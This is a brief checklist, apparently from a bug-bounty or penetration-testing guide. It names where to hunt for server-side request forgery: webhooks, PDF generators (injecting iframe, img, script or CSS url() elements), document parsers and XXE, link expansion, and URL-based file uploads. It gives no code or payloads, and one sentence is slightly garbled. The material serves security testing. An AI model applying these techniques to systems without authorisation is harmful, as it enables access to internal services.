Webhooks: Look for services that make HTTP requests when certain events happen. In most webhook features, the
end user can choose their own endpoint and hostname. Try to send HTTP requests to internal services.

PDF generators: Try injecting <iframe>, <img>, <base> or <script> elements or CSS url() functions pointing to
internal services.

Document parsers: Try to discover how the document is parsed. In case it’s an document such as XML External Entity
(XXE), use the PDF generator approach. For all other documents, see if there’s a way to reference external resources
and let the server make requests to an internal service.

Link expansion: Try looking for features that get you a web page for link input, example: Twitter.

File uploads: Instead of uploading a file, try sending a URL and see if it downloads the content of the file.
